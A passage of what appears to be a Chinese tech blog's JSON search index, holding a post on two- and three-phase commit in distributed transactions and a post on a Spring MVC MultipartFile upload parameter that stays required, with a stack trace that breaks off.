doCommit&#x9636;&#x6BB5;&#x8BE5;&#x9636;&#x6BB5;&#x8FDB;&#x884C;&#x771F;&#x6B63;&#x7684;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;&#x4E24;&#x79CD;&#x60C5;&#x51B5; &#x6267;&#x884C;&#x63D0;&#x4EA4; &#x53D1;&#x9001;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42; &#x534F;&#x8C03;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;&#x7684;ACK&#x54CD;&#x5E94;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x5C06;&#x4ECE;&#x9884;&#x63D0;&#x4EA4;&#x72B6;&#x6001;&#x8FDB;&#x5165;&#x5230;&#x63D0;&#x4EA4;&#x72B6;&#x6001;&#x3002;&#x5E76;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;doCommit&#x8BF7;&#x6C42;&#x3002; &#x4E8B;&#x52A1;&#x63D0;&#x4EA4; &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;doCommit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C;&#x6B63;&#x5F0F;&#x7684;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x3002;&#x5E76;&#x5728;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x4E4B;&#x540E;&#x91CA;&#x653E;&#x6240;&#x6709;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x3002; &#x54CD;&#x5E94;&#x53CD;&#x9988; &#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x5B8C;&#x4E4B;&#x540E;&#xFF0C;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;Ack&#x54CD;&#x5E94;&#x3002; &#x5B8C;&#x6210;&#x4E8B;&#x52A1; &#x534F;&#x8C03;&#x8005;&#x63A5;&#x6536;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;ack&#x54CD;&#x5E94;&#x4E4B;&#x540E;&#xFF0C;&#x5B8C;&#x6210;&#x4E8B;&#x52A1; &#x4E2D;&#x65AD;&#x4E8B;&#x52A1; &#x534F;&#x8C03;&#x8005;&#x6CA1;&#x6709;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;&#x7684;ACK&#x54CD;&#x5E94;&#xFF08;&#x53EF;&#x80FD;&#x662F;&#x63A5;&#x53D7;&#x8005;&#x53D1;&#x9001;&#x7684;&#x4E0D;&#x662F;ACK&#x54CD;&#x5E94;&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x54CD;&#x5E94;&#x8D85;&#x65F6;&#xFF09;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x4E2D;&#x65AD;&#x4E8B;&#x52A1;&#x3002; &#x53D1;&#x9001;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42; &#x534F;&#x8C03;&#x8005;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;abort&#x8BF7;&#x6C42; &#x4E8B;&#x52A1;&#x56DE;&#x6EDA; &#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;abort&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x5229;&#x7528;&#x5176;&#x5728;&#x9636;&#x6BB5;&#x4E8C;&#x8BB0;&#x5F55;&#x7684;undo&#x4FE1;&#x606F;&#x6765;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x56DE;&#x6EDA;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5728;&#x5B8C;&#x6210;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#x91CA;&#x653E;&#x6240;&#x6709;&#x7684;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x3002; &#x53CD;&#x9988;&#x7ED3;&#x679C; &#x53C2;&#x4E0E;&#x8005;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#xFF0C;&#x5411;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;ACK&#x6D88;&#x606F; &#x4E2D;&#x65AD;&#x4E8B;&#x52A1; &#x534F;&#x8C03;&#x8005;&#x63A5;&#x6536;&#x5230;&#x53C2;&#x4E0E;&#x8005;&#x53CD;&#x9988;&#x7684;ACK&#x6D88;&#x606F;&#x4E4B;&#x540E;&#xFF0C;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x4E2D;&#x65AD; &#x5728;doCommit&#x9636;&#x6BB5;&#xFF0C;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x65E0;&#x6CD5;&#x53CA;&#x65F6;&#x63A5;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;doCommit&#x6216;&#x8005;rebort&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x7EE7;&#x7EED;&#x8FDB;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x63D0;&#x4EA4;&#x3002;&#xFF08;&#x5176;&#x5B9E;&#x8FD9;&#x4E2A;&#x5E94;&#x8BE5;&#x662F;&#x57FA;&#x4E8E;&#x6982;&#x7387;&#x6765;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x5F53;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x65F6;&#xFF0C;&#x8BF4;&#x660E;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;PreCommit&#x8BF7;&#x6C42;&#xFF0C;&#x90A3;&#x4E48;&#x534F;&#x8C03;&#x8005;&#x4EA7;&#x751F;PreCommit&#x8BF7;&#x6C42;&#x7684;&#x524D;&#x63D0;&#x6761;&#x4EF6;&#x662F;&#x4ED6;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#xFF0C;&#x6536;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;CanCommit&#x54CD;&#x5E94;&#x90FD;&#x662F;Yes&#x3002;&#xFF08;&#x4E00;&#x65E6;&#x53C2;&#x4E0E;&#x8005;&#x6536;&#x5230;&#x4E86;PreCommit&#xFF0C;&#x610F;&#x5473;&#x4ED6;&#x77E5;&#x9053;&#x5927;&#x5BB6;&#x5176;&#x5B9E;&#x90FD;&#x540C;&#x610F;&#x4FEE;&#x6539;&#x4E86;&#xFF09;&#x6240;&#x4EE5;&#xFF0C;&#x4E00;&#x53E5;&#x8BDD;&#x6982;&#x62EC;&#x5C31;&#x662F;&#xFF0C;&#x5F53;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x8D85;&#x65F6;&#x7B49;&#x539F;&#x56E0;&#xFF0C;&#x867D;&#x7136;&#x53C2;&#x4E0E;&#x8005;&#x6CA1;&#x6709;&#x6536;&#x5230;commit&#x6216;&#x8005;abort&#x54CD;&#x5E94;&#xFF0C;&#x4F46;&#x662F;&#x4ED6;&#x6709;&#x7406;&#x7531;&#x76F8;&#x4FE1;&#xFF1A;&#x6210;&#x529F;&#x63D0;&#x4EA4;&#x7684;&#x51E0;&#x7387;&#x5F88;&#x5927;&#x3002; &#xFF09; 2PC&#x4E0E;3PC&#x7684;&#x533A;&#x522B;&#x76F8;&#x5BF9;&#x4E8E;2PC&#xFF0C;3PC&#x4E3B;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x5355;&#x70B9;&#x6545;&#x969C;&#x95EE;&#x9898;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x963B;&#x585E;&#xFF0C;&#x56E0;&#x4E3A;&#x4E00;&#x65E6;&#x53C2;&#x4E0E;&#x8005;&#x65E0;&#x6CD5;&#x53CA;&#x65F6;&#x6536;&#x5230;&#x6765;&#x81EA;&#x534F;&#x8C03;&#x8005;&#x7684;&#x4FE1;&#x606F;&#x4E4B;&#x540E;&#xFF0C;&#x4ED6;&#x4F1A;&#x9ED8;&#x8BA4;&#x6267;&#x884C;commit&#x3002;&#x800C;&#x4E0D;&#x4F1A;&#x4E00;&#x76F4;&#x6301;&#x6709;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x5E76;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x673A;&#x5236;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x56E0;&#x4E3A;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x539F;&#x56E0;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x9001;&#x7684;abort&#x54CD;&#x5E94;&#x6CA1;&#x6709;&#x53CA;&#x65F6;&#x88AB;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x6536;&#x5230;&#xFF0C;&#x90A3;&#x4E48;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x7B49;&#x5F85;&#x8D85;&#x65F6;&#x4E4B;&#x540E;&#x6267;&#x884C;&#x4E86;commit&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x6837;&#x5C31;&#x548C;&#x5176;&#x4ED6;&#x63A5;&#x5230;abort&#x547D;&#x4EE4;&#x5E76;&#x6267;&#x884C;&#x56DE;&#x6EDA;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x6570;&#x636E;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x60C5;&#x51B5;&#x3002; &#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x5BF9;2PC&#x548C;3PC&#x533A;&#x522B;&#x7684;&#x63CF;&#x8FF0;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Three-phase commit&#xFF09;&#xFF0C;&#x4E5F;&#x53EB;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Three-phase commit protocol&#xFF09;&#xFF0C;&#x662F;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x7F51;&#x7EDC;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x7684;&#x8303;&#x7574;&#x4E0B;&#xFF0C;&#x4F7F;&#x5F97;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x5185;&#x7684;&#x6240;&#x6709;&#x8282;&#x70B9;&#x80FD;&#x591F;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x7684;&#x63D0;&#x4EA4;&#x7684;&#x4E00;&#x79CD;&#x5206;&#x5E03;&#x5F0F;&#x7B97;&#x6CD5;&#x3002;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x662F;&#x4E3A;&#x89E3;&#x51B3;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;|&#x7684;&#x7F3A;&#x70B9;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x3002; &#x4E0E;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x662F;&#x201C;&#x975E;&#x963B;&#x585E;&#x201D;&#x534F;&#x8BAE;&#x3002;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5728;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x4E0E;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E4B;&#x95F4;&#x63D2;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x51C6;&#x5907;&#x9636;&#x6BB5;&#xFF0C;&#x4F7F;&#x5F97;&#x539F;&#x5148;&#x5728;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E2D;&#xFF0C;&#x53C2;&#x4E0E;&#x8005;&#x5728;&#x6295;&#x7968;&#x4E4B;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x5D29;&#x6E83;&#x6216;&#x9519;&#x8BEF;&#xFF0C;&#x800C;&#x5BFC;&#x81F4;&#x53C2;&#x4E0E;&#x8005;&#x5904;&#x4E8E;&#x65E0;&#x6CD5;&#x77E5;&#x6653;&#x662F;&#x5426;&#x63D0;&#x4EA4;&#x6216;&#x8005;&#x4E2D;&#x6B62;&#x7684;&#x201C;&#x4E0D;&#x786E;&#x5B9A;&#x72B6;&#x6001;&#x201D;&#x6240;&#x4EA7;&#x751F;&#x7684;&#x53EF;&#x80FD;&#x76F8;&#x5F53;&#x957F;&#x7684;&#x5EF6;&#x65F6;&#x7684;&#x95EE;&#x9898;[1]&#x5F97;&#x4EE5;&#x89E3;&#x51B3;&#x3002; &#x4E3E;&#x4F8B;&#x6765;&#x8BF4;&#xFF0C;&#x5047;&#x8BBE;&#x6709;&#x4E00;&#x4E2A;&#x51B3;&#x7B56;&#x5C0F;&#x7EC4;&#x7531;&#x4E00;&#x4E2A;&#x4E3B;&#x6301;&#x4EBA;&#x8D1F;&#x8D23;&#x4E0E;&#x591A;&#x4F4D;&#x7EC4;&#x5458;&#x4EE5;&#x7535;&#x8BDD;&#x8054;&#x7EDC;&#x65B9;&#x5F0F;&#x534F;&#x8C03;&#x662F;&#x5426;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF0C;&#x4EE5;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x6765;&#x8BF4;&#xFF0C;&#x4E3B;&#x6301;&#x4EBA;&#x6536;&#x5230;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#x8BF7;&#x6C42;&#xFF0C;&#x6253;&#x7535;&#x8BDD;&#x8DDF;&#x6BCF;&#x4E2A;&#x7EC4;&#x5458;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x901A;&#x8FC7;&#x5E76;&#x7EDF;&#x8BA1;&#x56DE;&#x590D;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6700;&#x540E;&#x51B3;&#x5B9A;&#x6253;&#x7535;&#x8BDD;&#x901A;&#x77E5;&#x5404;&#x7EC4;&#x5458;&#x3002;&#x8981;&#x662F;&#x4E3B;&#x6301;&#x4EBA;&#x5728;&#x8DDF;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x901A;&#x5B8C;&#x7535;&#x8BDD;&#x540E;&#x5931;&#x5FC6;&#xFF0C;&#x800C;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x5728;&#x5F97;&#x77E5;&#x7ED3;&#x679C;&#x5E76;&#x6267;&#x884C;&#x540E;&#x8001;&#x4EBA;&#x75F4;&#x5446;&#xFF0C;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x91CD;&#x65B0;&#x9009;&#x51FA;&#x4E3B;&#x6301;&#x4EBA;&#xFF0C;&#x4E5F;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x6700;&#x540E;&#x7684;&#x63D0;&#x6848;&#x51B3;&#x5B9A;&#x662F;&#x4EC0;&#x4E48;&#xFF0C;&#x4E5F;&#x8BB8;&#x662F;&#x901A;&#x8FC7;&#xFF0C;&#x4E5F;&#x8BB8;&#x662F;&#x9A73;&#x56DE;&#xFF0C;&#x4E0D;&#x7BA1;&#x5927;&#x5BB6;&#x9009;&#x62E9;&#x54EA;&#x4E00;&#x79CD;&#x51B3;&#x5B9A;&#xFF0C;&#x90FD;&#x6709;&#x53EF;&#x80FD;&#x4E0E;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x5DF2;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x771F;&#x5B9E;&#x51B3;&#x5B9A;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x8001;&#x677F;&#x5C31;&#x4F1A;&#x4E0D;&#x5F00;&#x5FC3;&#x8BA4;&#x4E3A;&#x51B3;&#x7B56;&#x5C0F;&#x7EC4;&#x6C9F;&#x901A;&#x6709;&#x95EE;&#x9898;&#x800C;&#x89E3;&#x96C7;&#x3002;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5373;&#x662F;&#x5F15;&#x5165;&#x4E86;&#x53E6;&#x4E00;&#x4E2A;&#x6B65;&#x9AA4;&#xFF0C;&#x4E3B;&#x6301;&#x4EBA;&#x6253;&#x7535;&#x8BDD;&#x8DDF;&#x7EC4;&#x5458;&#x901A;&#x77E5;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#xFF0C;&#x4EE5;&#x907F;&#x514D;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x771F;&#x5B9E;&#x51B3;&#x5B9A;&#x800C;&#x9020;&#x6210;&#x51B3;&#x5B9A;&#x4E0D;&#x4E00;&#x81F4;&#x7684;&#x5931;&#x4E1A;&#x5371;&#x673A;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x80FD;&#x591F;&#x89E3;&#x51B3;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x56DE;&#x5230;&#x521A;&#x521A;&#x63D0;&#x5230;&#x7684;&#x72B6;&#x51B5;&#xFF0C;&#x5728;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x5B8C;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x540E;&#x4E24;&#x4EBA;&#x610F;&#x5916;&#x5931;&#x5FC6;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x5168;&#x4F53;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x51B3;&#x5B9A;&#x4E3A;&#x4F55;&#xFF0C;&#x5168;&#x4F53;&#x51B3;&#x7B56;&#x7EC4;&#x5458;&#x4ECD;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x534F;&#x8C03;&#x8FC7;&#x7A0B;&#x6216;&#x76F4;&#x63A5;&#x5426;&#x51B3;&#xFF0C;&#x4E0D;&#x4F1A;&#x6709;&#x4E0D;&#x4E00;&#x81F4;&#x51B3;&#x5B9A;&#x800C;&#x5931;&#x4E1A;&#x3002;&#x90A3;&#x4E48;&#x5F53;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x5B8C;&#x5168;&#x4F53;&#x7EC4;&#x5458;&#x8BF7;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x5E76;&#x5F97;&#x5230;&#x5927;&#x5BB6;&#x7684;&#x518D;&#x6B21;&#x786E;&#x5B9A;&#x540E;&#x8FDB;&#x5165;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF0C;&#x5F53;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x8BF7;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#x540E;&#x4E24;&#x4EBA;&#x610F;&#x5916;&#x5931;&#x5FC6;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x5176;&#x4ED6;&#x7EC4;&#x5458;&#x518D;&#x91CD;&#x65B0;&#x9009;&#x51FA;&#x4E3B;&#x6301;&#x4EBA;&#x540E;&#xFF0C;&#x4ECD;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x76EE;&#x524D;&#x81F3;&#x5C11;&#x662F;&#x5904;&#x4E8E;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#x9636;&#x6BB5;&#xFF0C;&#x8868;&#x793A;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x5927;&#x5BB6;&#x90FD;&#x5DF2;&#x7ECF;&#x51B3;&#x5B9A;&#x8981;&#x901A;&#x8FC7;&#x4E86;&#xFF0C;&#x6B64;&#x65F6;&#x4FBF;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x3002; &#x540E;&#x8BB0;&#x4E86;&#x89E3;&#x4E86;2PC&#x548C;3PC&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x65E0;&#x8BBA;&#x662F;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x8FD8;&#x662F;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x90FD;&#x65E0;&#x6CD5;&#x5F7B;&#x5E95;&#x89E3;&#x51B3;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#x3002;Google Chubby&#x7684;&#x4F5C;&#x8005;Mike Burrows&#x8BF4;&#x8FC7;&#xFF0C; there is only one consensus protocol, and that&#x2019;s Paxos&#x201D; &#x2013; all other approaches are just broken versions of Paxos&#x3002; &#x610F;&#x5373;&#x4E16;&#x4E0A;&#x53EA;&#x6709;&#x4E00;&#x79CD;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#xFF0C;&#x90A3;&#x5C31;&#x662F;Paxos&#xFF0C;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x90FD;&#x662F;Paxos&#x7B97;&#x6CD5;&#x7684;&#x4E0D;&#x5B8C;&#x6574;&#x7248;&#x3002;","raw":null,"content":null,"categories":[{"name":"算法及理论","slug":"算法及理论","permalink":"http://www.wangxin123.com/categories/算法及理论/"}],"tags":[{"name":"分布式事务","slug":"分布式事务","permalink":"http://www.wangxin123.com/tags/分布式事务/"},{"name":"2pc","slug":"2pc","permalink":"http://www.wangxin123.com/tags/2pc/"},{"name":"3pc","slug":"3pc","permalink":"http://www.wangxin123.com/tags/3pc/"}]},{"title":"根据源码用HttpServletRequest获取MultipartFile的问题","slug":"根据源码用HttpServletRequest获取MultipartFile的问题","date":"2016-11-10T10:24:17.000Z","updated":"2016-11-17T11:59:42.681Z","comments":true,"path":"2016/11/10/根据源码用HttpServletRequest获取MultipartFile的问题/","link":"","permalink":"http://www.wangxin123.com/2016/11/10/根据源码用HttpServletRequest获取MultipartFile的问题/","excerpt":"&#x95EE;&#x9898;&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x539F;&#x56E0;&#xFF0C;&#x73B0;&#x5728;&#x9700;&#x8981;&#x8FD9;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;type(String)&#x662F;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#xFF0C;photoFile(MultipartFile)&#x662F;&#x975E;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#xFF0C;&#x5373;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x9700;&#x8981;&#x63A5;&#x53D7;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x522B;&#x4E3A;photoFile&#x548C;type&#xFF0C;&#x4F46;&#x662F;&#x5076;&#x5C14;&#x53EA;&#x63A5;&#x53D7;type&#x53C2;&#x6570;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x8D77;&#x5230;&#x4E0A;&#x4F20;&#x4F5C;&#x7528;&#x3002; &#x6309;&#x5E38;&#x89C4;&#x5199;&#x6CD5;&#xFF0C;photoFile&#x53C2;&#x6570;&#x7684;required&#x914D;&#x7F6E;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E86;false&#x3002; &#x5948;&#x4F55;&#x8C03;&#x8BD5;&#x65F6;&#x53D1;&#x73B0;&#xFF0C;photoFile&#x7684;required&#x914D;&#x7F6E;&#x662F;&#x5931;&#x6548;&#x7684;&#x3002;&#x5373;&#x4E0B;&#x9762;&#x7684;&#x63A5;&#x53E3;&#x5199;&#x6CD5;&#xFF0C;photoFile&#x6210;&#x4E86;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#x3002; 123456@ResponseBody@RequestMapping(value = &quot;/upload&quot;)public String uploadPics(@RequestPart(value = &quot;photoFile&quot;, required = false) MultipartFile photoFile, @RequestParam(value = &quot;type&quot;, required = true) String type, HttpServletRequest request) throws Exception { &#x3002;&#x3002;&#x3002;}","keywords":null,"text":"&#x95EE;&#x9898;&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x539F;&#x56E0;&#xFF0C;&#x73B0;&#x5728;&#x9700;&#x8981;&#x8FD9;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;type(String)&#x662F;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#xFF0C;photoFile(MultipartFile)&#x662F;&#x975E;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#xFF0C;&#x5373;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x9700;&#x8981;&#x63A5;&#x53D7;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x522B;&#x4E3A;photoFile&#x548C;type&#xFF0C;&#x4F46;&#x662F;&#x5076;&#x5C14;&#x53EA;&#x63A5;&#x53D7;type&#x53C2;&#x6570;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x8D77;&#x5230;&#x4E0A;&#x4F20;&#x4F5C;&#x7528;&#x3002; &#x6309;&#x5E38;&#x89C4;&#x5199;&#x6CD5;&#xFF0C;photoFile&#x53C2;&#x6570;&#x7684;required&#x914D;&#x7F6E;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E86;false&#x3002; &#x5948;&#x4F55;&#x8C03;&#x8BD5;&#x65F6;&#x53D1;&#x73B0;&#xFF0C;photoFile&#x7684;required&#x914D;&#x7F6E;&#x662F;&#x5931;&#x6548;&#x7684;&#x3002;&#x5373;&#x4E0B;&#x9762;&#x7684;&#x63A5;&#x53E3;&#x5199;&#x6CD5;&#xFF0C;photoFile&#x6210;&#x4E86;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#x3002; 123456@ResponseBody@RequestMapping(value = &quot;/upload&quot;)public String uploadPics(@RequestPart(value = &quot;photoFile&quot;, required = false) MultipartFile photoFile, @RequestParam(value = &quot;type&quot;, required = true) String type, HttpServletRequest request) throws Exception { &#x3002;&#x3002;&#x3002;} &#x5F53;&#x6A21;&#x62DF;upload&#x63A5;&#x53E3;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x643A;&#x5E26;photoFile&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x4E0A;&#x63A5;&#x53E3;&#x5199;&#x6CD5;&#x62A5;&#x9519;&#x5982;&#x4E0B;123456789101112org.springframework.web.multipart.MultipartException: The current request is not a multipart request at org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.assertIsMultipartRequest(RequestPartMethodArgumentResolver.java:178) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.resolveArgument(RequestPartMethodArgumentResolver.java:116) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:79) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:157) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:124) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:749) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:690) 